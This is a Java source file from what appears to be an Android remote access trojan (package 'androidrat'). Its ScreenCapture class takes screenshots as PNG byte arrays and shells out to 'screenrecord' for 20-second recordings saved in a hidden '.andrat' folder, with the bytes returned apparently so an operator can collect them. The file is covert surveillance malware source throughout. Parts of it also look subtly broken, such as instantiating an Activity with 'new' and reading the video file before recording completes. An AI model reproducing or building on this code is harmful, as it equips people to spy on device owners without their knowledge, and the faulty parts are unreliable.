package com.ot.androidrat;

import android.graphics.Bitmap;
import android.os.Environment;
import android.util.Log;
import android.view.View;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.time.LocalDateTime;

public class ScreenCapture {

    public static byte[] screencap(){
        try {
//            String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".jpg";
//            Log.i("directory", mPath);
            // create bitmap screen capture
            View v1 = new MainActivity().getWindow().getDecorView().getRootView();
            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);
            int quality = 100;

//            File imageFile = new File(mPath);
//            FileOutputStream outputStream = new FileOutputStream(imageFile);
//            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
//            outputStream.flush();
//            outputStream.close();
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, quality, stream);
            byte[] arr = stream.toByteArray();
            bitmap.recycle();
            return arr;

        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
//            Log.i("directory", e.getMessage());
            return null;
        }

    }

    public static byte[] screenRecord(){
        try{
            String curTime = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                curTime = LocalDateTime.now().toString();
            }
            String dir = "/storage/emulated/0/.andrat/";
            String filename = curTime + ".mp4";
            Runtime.getRuntime().exec("screenrecord --size \"1280x720\" --time-limit 20 " + dir + filename);
            return retrieveBytes(new File(dir + filename));
        }catch (IOException ioException){
            Log.i("ScreenRecord", "SMH out rn");
            return null;
        }
    }

    public static byte[] retrieveBytes(File file) throws IOException {
        FileInputStream fileInputStream = new FileInputStream(file);
        byte[] arr = new byte[(int) file.length()];
        fileInputStream.read(arr);
        fileInputStream.close();
        return arr;
    }

}
